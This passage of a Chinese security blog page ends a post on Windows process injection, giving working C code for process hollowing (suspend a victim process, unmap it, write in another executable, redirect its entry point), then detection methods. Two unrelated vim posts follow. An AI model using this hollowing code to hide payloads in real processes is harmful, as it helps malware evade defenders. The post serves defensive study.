class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">InjectProcess</span><span class="params">(LPTSTR VictimFile,LPTSTR InjectExe)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"> HANDLE hFile;</span><br><span class="line"> DWORD dwFileSize;    <span class="comment">//文件大小</span></span><br><span class="line"> IMAGE_DOS_HEADER DosHeader;</span><br><span class="line"> IMAGE_NT_HEADERS NtHeader;</span><br><span class="line"> PROCESS_INFORMATION pi;</span><br><span class="line"> STARTUPINFO si;</span><br><span class="line"> CONTEXT context;</span><br><span class="line"> PVOID ImageBase;</span><br><span class="line"> <span class="keyword">unsigned</span> <span class="keyword">long</span> ImageSize;</span><br><span class="line"> <span class="keyword">unsigned</span> <span class="keyword">long</span> BaseAddr;</span><br><span class="line"> <span class="keyword">unsigned</span> <span class="keyword">long</span> retByte = <span class="number">0</span>;</span><br><span class="line"> LONG offset;</span><br><span class="line"> HMODULE hNtDll=GetModuleHandle(<span class="string">"ntdll.dll"</span>);</span><br><span class="line"> <span class="keyword">if</span>(!hNtDll)</span><br><span class="line">  <span class="keyword">return</span> FALSE;</span><br><span class="line"> ZWUNMAPVIEWOFSECTION ZwUnmapViewOfSection = (ZWUNMAPVIEWOFSECTION)GetProcAddress(hNtDll,<span class="string">"ZwUnmapViewOfSection"</span>);</span><br><span class="line"> <span class="built_in">memset</span>(&amp;si, <span class="number">0</span>, <span class="keyword">sizeof</span>(si));</span><br><span class="line"> <span class="built_in">memset</span>(&amp;pi, <span class="number">0</span>, <span class="keyword">sizeof</span>(pi));</span><br><span class="line"> si.cb = <span class="keyword">sizeof</span>(si);</span><br><span class="line"></span><br><span class="line"> hFile = ::CreateFile(InjectExe,GENERIC_READ,FILE_SHARE_READ | FILE_SHARE_WRITE,<span class="literal">NULL</span>,OPEN_EXISTING,FILE_ATTRIBUTE_ARCHIVE,<span class="literal">NULL</span>);</span><br><span class="line"> <span class="keyword">if</span> (hFile == INVALID_HANDLE_VALUE)</span><br><span class="line"> &#123;</span><br><span class="line">  <span class="keyword">return</span> FALSE;</span><br><span class="line"> &#125;</span><br><span class="line"> ::SetFilePointer(hFile, <span class="number">0</span>, <span class="literal">NULL</span>, FILE_BEGIN);</span><br><span class="line"> dwFileSize = ::GetFileSize(hFile, <span class="literal">NULL</span>);</span><br><span class="line"> LPBYTE pBuf = <span class="keyword">new</span> BYTE[dwFileSize];</span><br><span class="line"> <span class="built_in">memset</span>(pBuf, <span class="number">0</span>, dwFileSize);</span><br><span class="line"> DWORD dwNumberOfBytesRead = <span class="number">0</span>;</span><br><span class="line">    ::ReadFile( hFile</span><br><span class="line">        , pBuf</span><br><span class="line">        , dwFileSize</span><br><span class="line">        , &amp;dwNumberOfBytesRead</span><br><span class="line">        , <span class="literal">NULL</span></span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line"> ::CopyMemory((<span class="keyword">void</span> *)&amp;DosHeader,pBuf,<span class="keyword">sizeof</span>(IMAGE_DOS_HEADER));</span><br><span class="line"> ::CopyMemory((<span class="keyword">void</span> *)&amp;NtHeader,&amp;pBuf[DosHeader.e_lfanew],<span class="keyword">sizeof</span>(IMAGE_NT_HEADERS));</span><br><span class="line"> <span class="comment">//检查PE结构</span></span><br><span class="line"> <span class="comment">//以挂起方式进程</span></span><br><span class="line"> BOOL res = CreateProcess(<span class="literal">NULL</span>,VictimFile,<span class="literal">NULL</span>,<span class="literal">NULL</span>,FALSE,CREATE_SUSPENDED,<span class="literal">NULL</span>,<span class="literal">NULL</span>,&amp;si,&amp;pi); </span><br><span class="line"></span><br><span class="line"> <span class="keyword">if</span> (res)</span><br><span class="line"> &#123;</span><br><span class="line">  context.ContextFlags = CONTEXT_FULL;</span><br><span class="line">  <span class="keyword">if</span> (!GetThreadContext(pi.hThread,&amp;context))  <span class="comment">//如果调用失败</span></span><br><span class="line">  &#123;</span><br><span class="line">   CloseHandle(pi.hThread);</span><br><span class="line">   CloseHandle(pi.hProcess);</span><br><span class="line">   <span class="keyword">return</span> FALSE;</span><br><span class="line">  &#125;</span><br><span class="line">  ReadProcessMemory(pi.hProcess,(<span class="keyword">void</span> *)(context.Ebx + <span class="number">8</span>),&amp;BaseAddr,<span class="keyword">sizeof</span>(<span class="keyword">unsigned</span> <span class="keyword">long</span>),<span class="literal">NULL</span>);</span><br><span class="line">  <span class="keyword">if</span> (!BaseAddr)</span><br><span class="line">  &#123;</span><br><span class="line">   CloseHandle(pi.hThread);</span><br><span class="line">   CloseHandle(pi.hProcess);</span><br><span class="line">   <span class="keyword">return</span> FALSE;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">//拆卸傀儡进程内存模块</span></span><br><span class="line">  <span class="keyword">if</span> (ZwUnmapViewOfSection((<span class="keyword">unsigned</span> <span class="keyword">long</span>)pi.hProcess,BaseAddr))</span><br><span class="line">  &#123;</span><br><span class="line">   CloseHandle(pi.hThread);</span><br><span class="line">   CloseHandle(pi.hProcess);</span><br><span class="line">   <span class="keyword">return</span> FALSE;</span><br><span class="line">  &#125;</span><br><span class="line">  ImageBase = VirtualAllocEx(pi.hProcess, </span><br><span class="line">   (<span class="keyword">void</span> *)NtHeader.OptionalHeader.ImageBase,</span><br><span class="line">   NtHeader.OptionalHeader.SizeOfImage, </span><br><span class="line">   MEM_RESERVE|MEM_COMMIT, </span><br><span class="line">   PAGE_EXECUTE_READWRITE);  <span class="comment">//ImageBase 0x00400000</span></span><br><span class="line">  <span class="keyword">if</span> (ImageBase == <span class="literal">NULL</span>)</span><br><span class="line">  &#123;</span><br><span class="line">   DWORD wrongFlag = GetLastError();</span><br><span class="line">   CloseHandle(pi.hThread);</span><br><span class="line">   CloseHandle(pi.hProcess);</span><br><span class="line">   <span class="keyword">return</span> FALSE;</span><br><span class="line">  &#125;  </span><br><span class="line">  <span class="comment">//替换傀儡进程内存数据</span></span><br><span class="line">  <span class="keyword">if</span>(!WriteProcessMemory(pi.hProcess, ImageBase, pBuf, NtHeader.OptionalHeader.SizeOfHeaders, &amp;retByte))</span><br><span class="line">  &#123;</span><br><span class="line">   DWORD wrongFlag2 = GetLastError();  </span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">//DOS 头 + PE 头 + 区块表的总大小</span></span><br><span class="line">  <span class="comment">//定位到区块头</span></span><br><span class="line">  offset = DosHeader.e_lfanew + <span class="keyword">sizeof</span>(IMAGE_NT_HEADERS);</span><br><span class="line">  IMAGE_SECTION_HEADER secHeader;</span><br><span class="line">  WORD i = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> (;i &lt; NtHeader.FileHeader.NumberOfSections;i++)</span><br><span class="line">  &#123;</span><br><span class="line">   <span class="comment">//定位到各个区块</span></span><br><span class="line">   ::CopyMemory((<span class="keyword">void</span> *)&amp;secHeader, &amp;pBuf[offset + i*<span class="keyword">sizeof</span>(IMAGE_SECTION_HEADER)],<span class="keyword">sizeof</span>(IMAGE_SECTION_HEADER));</span><br><span class="line">   WriteProcessMemory(pi.hProcess,(LPVOID)((DWORD)ImageBase + secHeader.VirtualAddress),&amp;pBuf[secHeader.PointerToRawData],secHeader.SizeOfRawData,&amp;retByte);</span><br><span class="line">   VirtualProtectEx(pi.hProcess, (LPVOID)((DWORD)ImageBase + secHeader.VirtualAddress), secHeader.Misc.VirtualSize, PAGE_EXECUTE_READWRITE,&amp;BaseAddr);</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  context.ContextFlags = CONTEXT_FULL;</span><br><span class="line">  <span class="comment">//重置 执行文件入口</span></span><br><span class="line">  WriteProcessMemory(pi.hProcess, (<span class="keyword">void</span> *)(context.Ebx + <span class="number">8</span>), </span><br><span class="line">   &amp;ImageBase,   <span class="comment">//4194304</span></span><br><span class="line">   <span class="number">4</span>, &amp;retByte);</span><br><span class="line">  context.Eax = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)ImageBase + NtHeader.OptionalHeader.AddressOfEntryPoint;</span><br><span class="line">  SetThreadContext(pi.hThread,&amp;context);</span><br><span class="line">  ResumeThread(pi.hThread);</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> CloseHandle(pi.hThread);</span><br><span class="line"> CloseHandle(pi.hProcess);</span><br><span class="line"> ::CloseHandle(hFile);  </span><br><span class="line"> <span class="keyword">delete</span>[] pBuf;</span><br><span class="line"> <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="2-检测方法"><a href="#2-检测方法" class="headerlink" title="2. 检测方法"></a>2. 检测方法</h2><ol>
+<li>注册表相关注入继续可以通过Hook写注册表相关API实现监控</li>
+<li>SetWindowsHookEx则需要检查最后一个参数是否为0，为0表示全局注入，这是我们<br>  关注的地方。但是输入法之类的正常程序也可能使用注入技术。</li>
+<li>CreateRemoteThread进程注入比较复杂，核心要点是要有跨进程写入数据的动作，<br>  后续从两个维度来进行检查</li>
+</ol>
+<h3 id="2-1-检查跨进程写入的数据"><a href="#2-1-检查跨进程写入的数据" class="headerlink" title="2.1 检查跨进程写入的数据"></a>2.1 检查跨进程写入的数据</h3><p>虽然WriteProcessMemory的底层API经常被Windows底层用作数据传递，但是通过<br>特征可以识别出来</p>
+<ol>
+<li>写入的数据是PE文件</li>
+<li>写入的数据里包含.dll (一般是DLL文件名，或者是导入表相关数据)</li>
+<li>写入超长数据</li>
+</ol>
+<h3 id="2-2-检查线程代码执行部分地址"><a href="#2-2-检查线程代码执行部分地址" class="headerlink" title="2.2 检查线程代码执行部分地址"></a>2.2 检查线程代码执行部分地址</h3><p>检查代码地址是否在WriteProcessMemory写入的数据区域之内</p>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul>
+<li><a href="http://blog.opensecurityresearch.com/2013/01/windows-dll-injection-basics.html" target="_blank" rel="noopener">Windows DLL Injection Basics</a></li>
+<li><a href="http://blog.csdn.net/evi10r/article/details/6745138" target="_blank" rel="noopener">使用异步过程调用（APC）实现模块注入</a></li>
+<li><a href="http://bbs.pediy.com/showthread.php?t=99206" target="_blank" rel="noopener">Ring3下WX方法结束微点2009</a></li>
+<li><a href="http://blog.w4kfu.com/tag/duqu" target="_blank" rel="noopener">New method of injection</a></li>
+<li><a href="http://www.i7s3curi7y.com/win32-code-injection-techniques" target="_blank" rel="noopener">The Ultimate Win32 code injection Reference</a></li>
+</ul>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+        
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://usmacd.com/2020/03/19/svn_vim/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="henices">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="安全代码">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          
+            <a href="/2020/03/19/svn_vim/" class="post-title-link" itemprop="url">VIM + SVN 管理</a>
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2020-03-19 16:34:31" itemprop="dateCreated datePublished" datetime="2020-03-19T16:34:31+08:00">2020-03-19</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>公司使用svn管理源代码，避免不了要和svn打交道，有几个比较好的解决方案。</p>
+<h2 id="1-vcscommand-vim"><a href="#1-vcscommand-vim" class="headerlink" title="1. vcscommand.vim"></a>1. vcscommand.vim</h2><p><a href="http://www.vim.org/scripts/script.php?script_id=90" target="_blank" rel="noopener">http://www.vim.org/scripts/script.php?script_id=90</a></p>
+<p>这个插件的特点是支持的版本管理工具多,支持git，svn等常见版本管理工具。<br>vcscommand.vim插件默认绑定了无差别的快捷键，使用起来非常方便。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">|&lt;Leader&gt;|ca VCSAdd</span><br><span class="line">|&lt;Leader&gt;|cn VCSAnnotate</span><br><span class="line">|&lt;Leader&gt;|cN VCSAnnotate!</span><br><span class="line">|&lt;Leader&gt;|cc VCSCommit</span><br><span class="line">|&lt;Leader&gt;|cD VCSDelete</span><br><span class="line">|&lt;Leader&gt;|cd VCSDiff</span><br><span class="line">|&lt;Leader&gt;|cg VCSGotoOriginal</span><br><span class="line">|&lt;Leader&gt;|cG VCSGotoOriginal!</span><br><span class="line">|&lt;Leader&gt;|ci VCSInfo</span><br><span class="line">|&lt;Leader&gt;|cl VCSLog</span><br><span class="line">|&lt;Leader&gt;|cL VCSLock</span><br><span class="line">|&lt;Leader&gt;|cr VCSReview</span><br><span class="line">|&lt;Leader&gt;|cs VCSStatus</span><br><span class="line">|&lt;Leader&gt;|cu VCSUpdate</span><br><span class="line">|&lt;Leader&gt;|cU VCSUnlock</span><br><span class="line">|&lt;Leader&gt;|cv VCSVimDiff</span><br></pre></td></tr></table></figure>
+
+<p>这个 <code>&lt;Leader&gt;</code> 得看你定义了什么快捷键，vim 默认的是 <code>\</code></p>
+<h2 id="2-vim-unite-svn"><a href="#2-vim-unite-svn" class="headerlink" title="2.  vim-unite-svn"></a>2.  vim-unite-svn</h2><p>小日本写的unite.vim的svn插件，unite.vim 是一个非常不错的vim插件，<br>它的作用是 为vim 写简单界面，要使用vim-unite-svn首先需要安装unite.vim 插件，<br>折腾这个插件的原因是vcscommand.vim有些不太好的地方。</p>
+<ul>
+<li>buffer管理的不太好</li>
+<li>status 比较弱</li>
+<li>羡慕emacs的vc mode的体验</li>
+</ul>
+<p><a href="https://github.com/Shougo/unite.vim" target="_blank" rel="noopener">https://github.com/Shougo/unite.vim</a></p>
+<p>小日本写的 <code>vim-unite-svn</code> 插件太久没有更新了，有一些bug，我修改了一下，用了<br>一段时间暂时没有发现什么问题。</p>
+<p><a href="https://github.com/henices/vim-unite-svn" target="_blank" rel="noopener">https://github.com/henices/vim-unite-svn</a></p>
+<p>支持基本的svn命令， svn status, svn info, svn diff, svn commit, svn up</p>
+<p>使用示例</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">:Unite svn&#x2F;status</span><br><span class="line">:Unite svn&#x2F;diff</span><br><span class="line">:Unite svn&#x2F;blame</span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+        
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://usmacd.com/2020/03/19/vim_special_char/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="henices">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="安全代码">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          
+            <a href="/2020/03/19/vim_special_char/" class="post-title-link" itemprop="url">vim 输入特殊字符</a>
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2020-03-19 16:34:31" itemprop="dateCreated datePublished" datetime="2020-03-19T16:34:31+08:00">2020-03-19</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>vim 的编辑能力确实很强，今天说一下如何在vim中输入特殊字符，比如音标、unicode 字符。</p>
+<p><a href="http://vimhelp.appspot.com/digraph.txt.html" target="_blank" rel="noopener">http://vimhelp.appspot.com/digraph.txt.html</a><br><a href="http://vimhelp.appspot.com/insert.txt.html#i_CTRL-V_digit" target="_blank" rel="noopener">http://vimhelp.appspot.com/insert.txt.html#i_CTRL-V_digit</a></p>
+<p>关键就在上面两篇，可能许多人不喜欢看复杂的文章，我这里简单介绍一下用法。</p>
+<p>输入音标 ə</p>
+<p>i 进入编辑模式    CTRL-vu0259<br>那如何知道 ə 的 unicode hex number 是 0259呢，在vim的normal 模式下，将光标移动到ə输入ga</p>
+<p>输入 ⇒</p>
+<p>i 进入编辑模式   CTRL-k=&gt;<br>:dig 可以看到支持这种方法输入的unicode 字符</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+  </div>
+
+  
+  <nav class="pagination">
+    <a class="extend prev" rel="prev" href="/"><i class="fa fa-angle-left" aria-label="Previous page"></i></a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/3/"><i class="fa fa-angle-right" aria-label="Next page"></i></a>
+  </nav>
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">henices</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">22</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">9</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/henices" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;henices" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://weibo.com/henices" title="Weibo → https:&#x2F;&#x2F;weibo.com&#x2F;henices" rel="noopener" target="_blank"><i class="fa fa-fw fa-weibo"></i>Weibo</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://twitter.com/henices" title="Twitter → https:&#x2F;&#x2F;twitter.com&#x2F;henices" rel="noopener" target="_blank"><i class="fa fa-fw fa-twitter"></i>Twitter</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="/atom.xml" title="RSS → &#x2F;atom.xml"><i class="fa fa-fw fa-rss"></i>RSS</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">henices</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a>
+  </div>
+  <span class="post-meta-divider">|</span>
+  <div class="theme-info">Theme – <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a>
+  </div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="Total Visitors">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="Total Views">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
